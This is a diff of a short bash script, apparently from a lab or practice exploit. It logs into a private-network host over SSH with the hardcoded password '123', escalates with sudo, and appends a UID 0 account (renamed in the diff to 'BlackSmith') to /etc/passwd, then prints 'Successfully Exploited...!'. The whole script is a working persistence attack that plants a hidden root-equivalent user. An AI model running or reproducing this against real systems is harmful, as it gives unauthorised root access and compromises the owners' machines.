@@ -1,6 +1,5 @@
 #!/bin/bash
 
-
 sshpass -p '123' ssh linux1@172.20.10.10 << EOF
 echo 'old passwd file'
 echo ''
@@ -9,10 +8,10 @@ echo ''
 
 sudo su
 
-echo 'reallybadguy1:x:0:1000::/home/goodguy:/bin/bash' >> /etc/passwd
+echo 'BlackSmith:x:0:1000::/home/goodguy:/bin/bash' >> /etc/passwd
 echo ''
 echo ''
-echo 'new passwd file after exploit'
+echo 'Successfully Exploited...!'
 echo ' '
 cat /etc/passwd
 
